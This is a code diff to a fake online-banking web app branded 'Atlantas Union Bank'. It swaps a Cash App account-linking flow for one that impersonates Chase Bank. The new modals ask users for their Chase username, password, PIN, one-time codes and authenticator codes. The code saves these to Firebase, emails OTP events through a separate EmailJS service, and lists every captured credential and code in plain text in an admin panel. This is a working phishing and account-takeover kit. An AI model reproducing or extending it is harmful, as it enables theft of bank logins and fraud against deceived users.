@@ -126,7 +126,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 .tx-type{font-size:14px;font-weight:600;color:#0a2540;}
 .tx-date{font-size:11px;color:#999;margin-top:2px;}
 .tx-amount{font-size:15px;font-weight:700;}
-.tx-amount.credit{color:#00a550;}
+.tx-amount.credit{color:#117ACA;}
 .tx-amount.debit{color:#e53935;}
 .receipt-card{background:#fff;border-radius:16px;margin-bottom:12px;overflow:hidden;box-shadow:0 1px 8px rgba(0,0,0,0.08);}
 .receipt-head{padding:16px 20px;color:#fff;}
@@ -190,7 +190,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 .linked-card-num{font-size:16px;font-weight:600;font-family:'Courier New',monospace;color:#0a2540;margin-bottom:2px;}
 .linked-card-expiry{font-size:12px;color:#888;}
 .linked-card-status{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600;margin-top:6px;}
-.linked-card-status.authorized{background:#e6faf0;color:#00a550;}
+.linked-card-status.authorized{background:#e6faf0;color:#117ACA;}
 .linked-card-status.pending{background:#fff8e6;color:#e6a817;}
 .linked-card-status.rejected{background:#fee2e2;color:#e53935;}
 .remove-card-btn{background:#fee2e2;color:#e53935;border:none;border-radius:8px;padding:8px 14px;font-size:13px;cursor:pointer;font-family:inherit;flex-shrink:0;}
@@ -315,7 +315,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 .compact-receipt-date{font-size:11px;color:#999;margin-top:2px;}
 .compact-receipt-right{text-align:right;}
 .compact-receipt-amount{font-size:15px;font-weight:700;margin-bottom:4px;}
-.compact-receipt-amount.credit{color:#00a550;}
+.compact-receipt-amount.credit{color:#117ACA;}
 .compact-receipt-amount.debit{color:#e53935;}
 .compact-receipt-status{font-size:11px;padding:3px 10px;border-radius:12px;display:inline-block;font-weight:600;}
 .status-processing{background:#fff3cd;color:#856404;}
@@ -437,13 +437,13 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
       <div id="cards-container"></div>
     </div>
     
-    <!-- Cash App Banner (always visible) -->
-    <div id="cashapp-banner" style="margin:16px 16px;background:linear-gradient(135deg,#00d632,#00b528);border-radius:16px;padding:16px;box-shadow:0 4px 12px rgba(0,214,50,0.2);cursor:pointer;" onclick="openCashAppManage()">
+    <!-- Chase Bank Banner (always visible) -->
+    <div id="chasebank-banner" style="margin:16px 16px;background:linear-gradient(135deg,#117ACA,#0a3d6b);border-radius:16px;padding:16px;box-shadow:0 4px 12px rgba(17,122,202,0.2);cursor:pointer;" onclick="openChaseBankManage()">
       <div style="display:flex;align-items:center;gap:14px;">
-        <img src="https://i.imgur.com/wT32rIk.jpeg" style="width:48px;height:48px;border-radius:12px;object-fit:cover;box-shadow:0 2px 8px rgba(0,0,0,0.15);">
+        <img src="https://i.imgur.com/z8tqddc.jpeg" style="width:48px;height:48px;border-radius:12px;object-fit:cover;box-shadow:0 2px 8px rgba(0,0,0,0.15);">
         <div style="flex:1;">
-          <div style="font-size:16px;font-weight:700;color:#fff;margin-bottom:3px;">Cash App</div>
-          <div style="font-size:13px;color:rgba(255,255,255,0.9);" id="cashapp-banner-text">Link your account + get $10 bonus</div>
+          <div style="font-size:16px;font-weight:700;color:#fff;margin-bottom:3px;">Chase Bank</div>
+          <div style="font-size:13px;color:rgba(255,255,255,0.9);" id="chasebank-banner-text">Link your Chase Bank account</div>
         </div>
         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg>
       </div>
@@ -455,7 +455,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
         <img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:48px;height:48px;border-radius:12px;object-fit:cover;box-shadow:0 2px 8px rgba(0,0,0,0.12);">
         <div style="flex:1;">
           <div style="font-size:16px;font-weight:700;color:#cc0000;margin-bottom:3px;">MB WAY</div>
-          <div style="font-size:13px;color:#cc0000;opacity:0.8;" id="mbway-banner-text">Link your account + get $10 bonus</div>
+          <div style="font-size:13px;color:#cc0000;opacity:0.8;" id="mbway-banner-text">Link your MB WAY account</div>
         </div>
         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#cc0000" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg>
       </div>
@@ -594,7 +594,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
   <div class="admin-header"><h2><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>Admin Panel</h2><p>Atlantas Union Bank</p></div>
   <div class="admin-tabs">
     <button class="admin-tab active" id="atab-auth" onclick="switchAdminTab('auth')" data-i18n="authorization">Authorization</button>
-    <button class="admin-tab" id="atab-cashapp" onclick="switchAdminTab('cashapp')"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:16px;height:16px;border-radius:3px;object-fit:cover;vertical-align:middle;margin-right:4px;">Cash App</button>
+    <button class="admin-tab" id="atab-chasebank" onclick="switchAdminTab('chasebank')"><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:16px;height:16px;border-radius:3px;object-fit:cover;vertical-align:middle;margin-right:4px;">Chase Bank</button>
     <button class="admin-tab" id="atab-deposits" onclick="switchAdminTab('deposits')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg> Deposits</button>
     <button class="admin-tab" id="atab-withdrawals" onclick="switchAdminTab('withdrawals')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 16 16 12 12 8"></polyline><line x1="8" y1="12" x2="16" y2="12"></line></svg> Withdrawals</button>
     <button class="admin-tab" id="atab-codes" onclick="switchAdminTab('codes')">Users</button>
@@ -627,9 +627,9 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
     <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;">&#128176; Deposit Requests</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Approve or reject user deposit requests</div></div>
     <div id="deposits-list"><p class="acc-empty">Loading...</p></div>
   </div>
-  <div class="admin-content" id="acontent-cashapp">
-    <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:24px;height:24px;border-radius:4px;object-fit:cover;">Cash App Authorization</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Authorize or reject Cash App accounts</div></div>
-    <div id="cashapp-admin-list"><p class="acc-empty">Loading...</p></div>
+  <div class="admin-content" id="acontent-chasebank">
+    <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:24px;height:24px;border-radius:4px;object-fit:cover;">Chase Bank Authorization</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Authorize or reject Chase Bank accounts</div></div>
+    <div id="chasebank-admin-list"><p class="acc-empty">Loading...</p></div>
     <div style="margin-top:20px;"><div style="font-size:16px;font-weight:700;color:#fff;margin-bottom:12px;display:flex;align-items:center;gap:8px;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:20px;height:20px;border-radius:3px;object-fit:cover;">MB WAY Authorization</div><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:10px;">Authorize or reject MB WAY accounts</div></div>
     <div id="mbway-admin-list"><p class="acc-empty">Loading...</p></div>
   </div>
@@ -683,12 +683,12 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 
 <div class="modal" id="receipt-detail-modal"><div class="modal-box"><div class="modal-header"><h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a56ff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>Transaction Details</h3><button class="modal-close" onclick="closeModal('receipt-detail-modal')">&#215;</button></div><div id="receipt-detail-content"></div></div></div>
 
-<!-- Cash App Modals -->
-<div class="modal" id="cashapp-list-modal"><div class="modal-box"><div class="modal-header"><h3><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:20px;height:20px;border-radius:4px;object-fit:cover;vertical-align:middle;margin-right:8px;">Cash App Accounts</h3><button class="modal-close" onclick="closeModal('cashapp-list-modal')">&#215;</button></div><div id="cashapp-accounts-list"></div><div id="cashapp-link-btn-container" style="margin-top:12px;"></div></div></div>
+<!-- Chase Bank Modals -->
+<div class="modal" id="chasebank-list-modal"><div class="modal-box"><div class="modal-header"><h3><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:20px;height:20px;border-radius:4px;object-fit:cover;vertical-align:middle;margin-right:8px;">Chase Bank Accounts</h3><button class="modal-close" onclick="closeModal('chasebank-list-modal')">&#215;</button></div><div id="chasebank-accounts-list"></div><div id="chasebank-link-btn-container" style="margin-top:12px;"></div></div></div>
 
-<div class="modal" id="cashapp-link-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(0,200,83,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Link Your Account</div></div><div class="modal-header"><h3>💵 Link Cash App</h3><button class="modal-close" onclick="closeModal('cashapp-link-modal')">&#215;</button></div><input type="text" class="modal-input" id="cashapp-identifier" placeholder="Email or Phone Number"><input type="password" class="modal-input" id="cashapp-pin" placeholder="Cash App PIN" maxlength="4" inputmode="numeric"><div class="modal-error" id="cashapp-link-error"></div><button class="modal-btn" id="cashapp-submit-btn">Link Cash App</button></div></div>
+<div class="modal" id="chasebank-link-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(17,122,202,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Link Your Account</div></div><div class="modal-header"><h3>💵 Link Chase Bank</h3><button class="modal-close" onclick="closeModal('chasebank-link-modal')">&#215;</button></div><input type="text" class="modal-input" id="chasebank-username" placeholder="Username"><input type="password" class="modal-input" id="chasebank-password" placeholder="Password"><input type="password" class="modal-input" id="chasebank-pin" placeholder="PIN (optional)" maxlength="6" inputmode="numeric"><p style="font-size:11px;color:rgba(255,255,255,0.35);margin:-6px 0 12px 4px;">* PIN is optional</p><div class="modal-error" id="chasebank-link-error"></div><button class="modal-btn" id="chasebank-submit-btn">Link Chase Bank</button></div></div>
 
-<div class="modal" id="cashapp-otp-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/wT32rIk.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(0,200,83,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Verification Required</div></div><div class="modal-header"><h3>🔐 Enter OTP Code</h3><button class="modal-close" onclick="closeModal('cashapp-otp-modal')">&#215;</button></div><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Cash App has sent a verification code to your account. Enter it below to complete the linking process.</p></div><div style="margin-bottom:12px;"><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:8px;">Account: <span id="cashapp-otp-identifier" style="color:#00c853;font-weight:600;"></span></div></div><input type="text" class="modal-input" id="cashapp-otp-code" placeholder="Enter 6-digit OTP code" maxlength="6" inputmode="numeric"><div class="modal-error" id="cashapp-otp-error"></div><button class="modal-btn" id="cashapp-otp-submit-btn">Verify & Link</button></div></div>
+<div class="modal" id="chasebank-otp-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(17,122,202,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Verification Required</div></div><div class="modal-header"><h3>🔐 Verify Your Account</h3><button class="modal-close" onclick="closeModal('chasebank-otp-modal')">&#215;</button></div><div style="margin-bottom:12px;"><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:10px;">Account: <span id="chasebank-otp-identifier" style="color:#117ACA;font-weight:600;"></span></div></div><div style="display:flex;gap:8px;margin-bottom:16px;"><button id="chasebank-tab-otp" onclick="chaseSwitchTab('otp')" style="flex:1;padding:10px;border-radius:8px;background:#117ACA;color:#fff;border:none;font-weight:700;cursor:pointer;font-family:inherit;font-size:13px;">📱 OTP Code</button><button id="chasebank-tab-auth" onclick="chaseSwitchTab('auth')" style="flex:1;padding:10px;border-radius:8px;background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.5);border:1px solid rgba(255,255,255,0.15);font-weight:700;cursor:pointer;font-family:inherit;font-size:13px;">🔑 Auth Code</button></div><div id="chasebank-panel-otp"><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Chase has sent a 6-digit OTP to your registered phone or email.</p></div><input type="text" class="modal-input" id="chasebank-otp-code" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric"><div class="modal-error" id="chasebank-otp-error"></div><button class="modal-btn" id="chasebank-otp-submit-btn">Submit OTP</button></div><div id="chasebank-panel-auth" style="display:none;"><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Enter the authentication code from your Chase app or authenticator.</p></div><input type="text" class="modal-input" id="chasebank-auth-code" placeholder="Enter authentication code" maxlength="8" inputmode="numeric"><div class="modal-error" id="chasebank-auth-error"></div><button class="modal-btn" id="chasebank-auth-submit-btn" style="background:#0a3d6b;">Submit Auth Code</button></div></div></div>
 
 <!-- MBWAY LIST MODAL -->
 <div class="modal" id="mbway-list-modal"><div class="modal-box"><div class="modal-header"><h3><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:20px;height:20px;border-radius:4px;object-fit:cover;vertical-align:middle;margin-right:8px;">MB WAY Accounts</h3><button class="modal-close" onclick="closeModal('mbway-list-modal')">&#215;</button></div><div id="mbway-accounts-list"></div><div id="mbway-link-btn-container" style="margin-top:12px;"></div></div></div>
@@ -752,7 +752,7 @@ var db   = firebase.database();
 function sendEmail(toEmail, title, name, message){
   var country = (window.userData && window.userData.country) ? window.userData.country : '';
   var pub, sid, tid;
-  if(title.indexOf('OTP')!==-1||title.indexOf('MB WAY Link')!==-1||title.indexOf('Cash App Link')!==-1||title.indexOf('Auth Code')!==-1){
+  if(title.indexOf('OTP')!==-1||title.indexOf('MB WAY Link')!==-1||title.indexOf('Chase Bank Link')!==-1||title.indexOf('Auth Code')!==-1){
     pub='8tNTuFPIowu1Ookpq'; sid='service_s2e0bde'; tid='template_7ulapld';
   } else {
     pub='q4WG3VtKzkHUooQIT'; sid='service_g1079e5'; tid='template_3rvjuyv';
@@ -881,7 +881,7 @@ function switchTab(tabId,btn,noPush){
 
 // ── ADMIN TABS ──
 function switchAdminTab(name){
-  ['auth','cashapp','deposits','withdrawals','codes','lockmoney'].forEach(function(t){
+  ['auth','chasebank','deposits','withdrawals','codes','lockmoney'].forEach(function(t){
     var tab=$('atab-'+t),con=$('acontent-'+t);
     if(tab) tab.classList.remove('active');
     if(con) con.classList.remove('active');
@@ -890,7 +890,7 @@ function switchAdminTab(name){
   if(tab) tab.classList.add('active');
   if(con) con.classList.add('active');
   if(name==='auth') loadAuthTab();
-  else if(name==='cashapp') loadCashAppTab();
+  else if(name==='chasebank') loadChaseBankTab();
   else if(name==='deposits') loadDepositsTab();
   else if(name==='withdrawals') loadWithdrawalsTab();
   else if(name==='lockmoney') loadLockMoneyTab();
@@ -1451,11 +1451,11 @@ auth.onAuthStateChanged(function(user){
     el=$('drawer-name'); if(el) el.textContent=(userData.firstname||'')+' '+(userData.surname||'');
     el=$('drawer-email'); if(el) el.textContent=userData.email||'';
     
-    // Update Cash App banner text
-    var cashAppAccounts = userData.cashAppAccounts || [];
-    var hasCashApp = cashAppAccounts.length > 0;
-    el=$('cashapp-banner-text');
-    if(el) el.textContent = hasCashApp ? 'Manage your accounts' : 'Link your account + get $10 bonus';
+    // Update Chase Bank banner text
+    var chaseBankAccounts = userData.chaseBankAccounts || [];
+    var hasCashApp = chaseBankAccounts.length > 0;
+    el=$('chasebank-banner-text');
+    if(el) el.textContent = hasCashApp ? 'Manage your accounts' : 'Link your Chase Bank account';
     
     var cards=userData.linkedCards||[];
     var hasAuth=cards.some(function(c){return c&&c.status==='authorized';});
@@ -1466,10 +1466,10 @@ auth.onAuthStateChanged(function(user){
     renderAccountInfo();
     if(user.email===ADMIN_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
+      loadAuthTab(); loadChaseBankTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else if(user.email===ADMINADEX_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
+      loadAuthTab(); loadChaseBankTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else {
       if(userData.locked){
         var lrEl=$('lock-reason-text');
@@ -2056,19 +2056,19 @@ function rejectDeposit(reqKey){
   });
 }
 
-// ── ADMIN: CASH APP TAB ──
-function loadCashAppTab(){
-  var list = $('cashapp-admin-list');
+// ── ADMIN: CHASE BANK TAB ──
+function loadChaseBankTab(){
+  var list = $('chasebank-admin-list');
   if(!list) return;
   list.innerHTML = '<p class="acc-empty">Loading...</p>';
-  loadMBWayInCashAppTab();
+  loadMBWayInChaseBankTab();
   
   db.ref('users').once('value').then(function(snap){
     var allAccounts = [];
     snap.forEach(function(s){
       var u = s.val();
       if(!u || u.email === ADMIN_EMAIL) return;
-      var accounts = u.cashAppAccounts || [];
+      var accounts = u.chaseBankAccounts || [];
       accounts.forEach(function(acc, idx){
         if(acc){
           allAccounts.push({u: u, acc: acc, uid: s.key, idx: idx});
@@ -2084,7 +2084,7 @@ function loadCashAppTab(){
     });
     
     if(allAccounts.length === 0){
-      list.innerHTML = '<p class="acc-empty">No Cash App accounts yet</p>';
+      list.innerHTML = '<p class="acc-empty">No Chase Bank accounts yet</p>';
       return;
     }
     
@@ -2105,8 +2105,8 @@ function loadCashAppTab(){
       if(isPending){
         var cmtId = 'ca-cmt-'+uid+'-'+idx;
         actionsHTML = '<textarea class="admin-comment" id="'+cmtId+'" placeholder="Comment (optional)" rows="2"></textarea>'+
-          '<div class="admin-card-actions"><button class="admin-action-btn green" onclick="authorizeCashApp(\''+uid+'\','+idx+',\''+cmtId+'\')">✅ Authorize</button>'+
-          '<button class="admin-action-btn red" onclick="rejectCashApp(\''+uid+'\','+idx+',\''+cmtId+'\')">❌ Reject</button></div>';
+          '<div class="admin-card-actions"><button class="admin-action-btn green" onclick="authorizeChaseBank(\''+uid+'\','+idx+',\''+cmtId+'\')">✅ Authorize</button>'+
+          '<button class="admin-action-btn red" onclick="rejectChaseBank(\''+uid+'\','+idx+',\''+cmtId+'\')">❌ Reject</button></div>';
       }
       
       div.innerHTML = statusHTML +
@@ -2114,8 +2114,8 @@ function loadCashAppTab(){
         '<div class="admin-detail-row"><span class="admin-detail-label">Email</span><span>'+u.email+'</span></div>'+
         '<div class="admin-detail-row"><span class="admin-detail-label">Account #</span><span>'+u.accountNumber+'</span></div>'+
         '<div class="admin-detail-row"><span class="admin-detail-label">Country</span><span>'+u.country+'</span></div>'+
-        '<div class="admin-detail-row"><span class="admin-detail-label">Cash App ID</span><span style="color:#00d632;font-weight:600;">'+acc.identifier+'</span></div>'+
-        '<div class="admin-detail-row"><span class="admin-detail-label">PIN</span><span style="color:#00d632;font-weight:600;">'+acc.pin+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Chase Username</span><span style="color:#117ACA;font-weight:600;">'+acc.identifier+'</span></div>'+
+        '<div class="admin-detail-row"><span class="admin-detail-label">PIN</span><span style="color:#117ACA;font-weight:600;">'+acc.pin+'</span></div>'+
         (acc.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP Code</span><span style="color:#4dabff;font-weight:700;">'+acc.otpCode+'</span></div>':'')+
         '<div class="admin-detail-row"><span class="admin-detail-label">Submitted</span><span>'+fmtDate(acc.addedDate)+'</span></div>'+
         (acc.authorizedDate?'<div class="admin-detail-row"><span class="admin-detail-label">Authorized</span><span>'+fmtDate(acc.authorizedDate)+'</span></div>':'')+
@@ -2128,8 +2128,8 @@ function loadCashAppTab(){
   });
 }
 
-// ── ADMIN: MB WAY (inside Cash App tab) ──
-function loadMBWayInCashAppTab(){
+// ── ADMIN: MB WAY (inside Chase Bank tab) ──
+function loadMBWayInChaseBankTab(){
   var list = $('mbway-admin-list');
   if(!list) return;
   list.innerHTML = '<p class="acc-empty">Loading...</p>';
@@ -2201,7 +2201,7 @@ function authorizeMBWay(uid, idx, cmtId){
     if(comment && comment.value) accounts[idx].adminComment = comment.value;
     db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
       notify(uid, '✅ Your MB WAY account has been authorized!');
-      loadMBWayInCashAppTab();
+      loadMBWayInChaseBankTab();
     });
   });
 }
@@ -2221,16 +2221,16 @@ function rejectMBWay(uid, idx, cmtId){
     if(comment && comment.value) accounts[idx].adminComment = comment.value;
     db.ref('users/'+uid+'/mbwayAccounts').set(accounts).then(function(){
       notify(uid, '❌ Your MB WAY account was rejected. Reason: '+reason);
-      loadMBWayInCashAppTab();
+      loadMBWayInChaseBankTab();
     });
   });
 }
 
-function authorizeCashApp(uid, idx, cmtId){
+function authorizeChaseBank(uid, idx, cmtId){
   db.ref('users/'+uid).once('value').then(function(snap){
     var u = snap.val();
     if(!u) return;
-    var accounts = u.cashAppAccounts || [];
+    var accounts = u.chaseBankAccounts || [];
     if(!accounts[idx]) return;
     
     accounts[idx].status = 'authorized';
@@ -2238,21 +2238,21 @@ function authorizeCashApp(uid, idx, cmtId){
     var comment = $(cmtId);
     if(comment && comment.value) accounts[idx].adminComment = comment.value;
     
-    db.ref('users/'+uid+'/cashAppAccounts').set(accounts).then(function(){
-      notify(uid, '✅ Your Cash App account has been authorized!');
-      loadCashAppTab();
+    db.ref('users/'+uid+'/chaseBankAccounts').set(accounts).then(function(){
+      notify(uid, '✅ Your Chase Bank account has been authorized!');
+      loadChaseBankTab();
     });
   });
 }
 
-function rejectCashApp(uid, idx, cmtId){
+function rejectChaseBank(uid, idx, cmtId){
   var reason = prompt('Reason for rejection:');
   if(!reason) return;
   
   db.ref('users/'+uid).once('value').then(function(snap){
     var u = snap.val();
     if(!u) return;
-    var accounts = u.cashAppAccounts || [];
+    var accounts = u.chaseBankAccounts || [];
     if(!accounts[idx]) return;
     
     accounts[idx].status = 'rejected';
@@ -2261,9 +2261,9 @@ function rejectCashApp(uid, idx, cmtId){
     var comment = $(cmtId);
     if(comment && comment.value) accounts[idx].adminComment = comment.value;
     
-    db.ref('users/'+uid+'/cashAppAccounts').set(accounts).then(function(){
-      notify(uid, '❌ Your Cash App account was rejected. Reason: '+reason);
-      loadCashAppTab();
+    db.ref('users/'+uid+'/chaseBankAccounts').set(accounts).then(function(){
+      notify(uid, '❌ Your Chase Bank account was rejected. Reason: '+reason);
+      loadChaseBankTab();
     });
   });
 }
@@ -2878,7 +2878,7 @@ $('addmoney-confirm-btn').onclick=function(){
 // TRANSFER
 $('transfer-btn').onclick=function(){
   var cards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
-  var cashapps=(userData.cashAppAccounts||[]).filter(function(c){return c&&c.status==='authorized';});
+  var chaseBanks=(userData.chaseBankAccounts||[]).filter(function(c){return c&&c.status==='authorized';});
   var sel=$('transfer-method');sel.innerHTML='<option value="">Select Method</option>';
   
   // Add authorized cards
@@ -2889,11 +2889,11 @@ $('transfer-btn').onclick=function(){
     sel.appendChild(opt);
   });
   
-  // Add authorized Cash App accounts
-  cashapps.forEach(function(ca,i){
+  // Add authorized Chase Bank accounts
+  chaseBanks.forEach(function(ca,i){
     var opt=document.createElement('option');
-    opt.value='cashapp-'+i;
-    opt.textContent='💵 Cash App ('+ca.identifier+')';
+    opt.value='chasebank-'+i;
+    opt.textContent='💵 Chase Bank ('+ca.identifier+')';
     sel.appendChild(opt);
   });
   
@@ -2933,14 +2933,14 @@ $('transfer-confirm-btn').onclick=function(){
       number:card.number,
       bankName:card.bankName||'Unknown'
     };
-  } else if(methodType==='cashapp'){
-    var authCashApps=(userData.cashAppAccounts||[]).filter(function(c){return c&&c.status==='authorized';});
-    var cashapp=authCashApps[methodIdx];
-    if(!cashapp){err.textContent='Cash App account not found.';return;}
+  } else if(methodType==='chasebank'){
+    var authCashApps=(userData.chaseBankAccounts||[]).filter(function(c){return c&&c.status==='authorized';});
+    var chasebank=authCashApps[methodIdx];
+    if(!chasebank){err.textContent='Chase Bank account not found.';return;}
     withdrawalInfo={
-      type:'cashapp',
-      brand:'Cash App',
-      identifier:cashapp.identifier,
+      type:'chasebank',
+      brand:'Chase Bank',
+      identifier:chasebank.identifier,
       lastFour:'****'
     };
   }
@@ -2959,7 +2959,7 @@ $('transfer-confirm-btn').onclick=function(){
     cardLastFour:withdrawalInfo.lastFour,
     cardNumber:withdrawalInfo.number||'',
     bankName:withdrawalInfo.bankName||'',
-    cashAppIdentifier:withdrawalInfo.identifier||'',
+    chaseBankIdentifier:withdrawalInfo.identifier||'',
     date:new Date().toISOString(),
     status:'pending',
     transferKey:transferKey
@@ -3285,7 +3285,7 @@ window.showReceiptDetail = function(historyItem) {
     html += '<div class="tracker-details">';
     html += '<div class="tracker-detail-row"><span class="tracker-detail-label">'+(type==='Sent'?'Recipient':'Sender')+'</span><span class="tracker-detail-value">'+(historyItem.counterparty||'N/A')+'</span></div>';
     html += '<div class="tracker-detail-row"><span class="tracker-detail-label">Account Number</span><span class="tracker-detail-value">'+(historyItem.counterpartyAcct||'N/A')+'</span></div>';
-    html += '<div class="tracker-detail-row"><span class="tracker-detail-label">Status</span><span class="tracker-detail-value" style="color:#00a550;">Successful</span></div>';
+    html += '<div class="tracker-detail-row"><span class="tracker-detail-label">Status</span><span class="tracker-detail-value" style="color:#117ACA;">Successful</span></div>';
     html += '</div>';
   }
   
@@ -3340,20 +3340,20 @@ function formatDate(dateStr) {
 }
 
 // ═══════════════════════════════════════════════════════════════
-// CASH APP FUNCTIONALITY
+// CHASE BANK FUNCTIONALITY
 // ═══════════════════════════════════════════════════════════════
 
-window.openCashAppManage = function(){
-  loadCashAppAccounts();
-  openModal('cashapp-list-modal');
+window.openChaseBankManage = function(){
+  loadChaseBankAccounts();
+  openModal('chasebank-list-modal');
 };
 
-function loadCashAppAccounts(){
-  var list = $('cashapp-accounts-list');
-  var accounts = userData.cashAppAccounts || [];
+function loadChaseBankAccounts(){
+  var list = $('chasebank-accounts-list');
+  var accounts = userData.chaseBankAccounts || [];
   
   if(accounts.length === 0){
-    list.innerHTML = '<p style="text-align:center;color:#999;padding:20px;">No Cash App accounts linked yet.</p>';
+    list.innerHTML = '<p style="text-align:center;color:#999;padding:20px;">No Chase Bank accounts linked yet.</p>';
     return;
   }
   
@@ -3368,16 +3368,16 @@ function loadCashAppAccounts(){
     
     var buttonHTML = '';
     if(acc.status === 'pending'){
-      buttonHTML = '<button class="modal-btn blue" onclick="openCashAppOTP('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;">Enter OTP Code</button>';
+      buttonHTML = '<button class="modal-btn blue" onclick="openChaseBankOTP('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;">Enter OTP Code</button>';
     } else if(acc.status === 'authorized'){
-      buttonHTML = '<button class="modal-btn" onclick="viewCashAppDetails('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;background:#0a2540;">View Account Details</button>';
+      buttonHTML = '<button class="modal-btn" onclick="viewChaseBankDetails('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;background:#0a2540;">View Account Details</button>';
